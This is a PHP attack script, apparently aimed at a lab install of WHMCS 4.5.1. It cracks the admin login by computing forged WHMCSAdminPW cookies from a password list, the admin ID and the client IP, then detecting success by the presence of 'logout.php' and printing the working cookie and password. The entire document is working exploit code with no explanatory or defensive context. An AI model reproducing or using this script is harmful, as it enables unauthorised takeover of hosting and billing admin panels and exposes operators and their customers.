<?
set_time_limit(0);
$site="http://192.168.56.133/lab/whmcs/whmcs_v451/whmcs/admin/index.php"; //site + admin path
$passlist='pass.txt';
$ip="192.168.56.1"; //Your ip
$id="1"; //User Id
//End of editing area :p
function cu($url,$co){
$curl=curl_init();
curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
curl_setopt($curl,CURLOPT_URL,$url);
curl_setopt($curl,CURLOPT_COOKIE,$co);
curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 Farsawy :D');
curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
curl_setopt($curl,CURLOPT_TIMEOUT,5);
$exec=curl_exec($curl);
curl_close($curl);
return $exec;
}
$pwd=file($passlist);
foreach ($pwd as $fapass){
$cookie=md5($id.md5($fapass).$ip);
$cookies="WHMCSAdminID=$id;WHMCSAdminPW=$cookie";
if(eregi('logout.php',cu($site,$cookies)))
{
die("<b>logged in with cookies </b> > $cookies<br><b>Password</b> > $fapass<br>");
}
else{
echo "$fapass >  Wrong<br>";
}
}
?>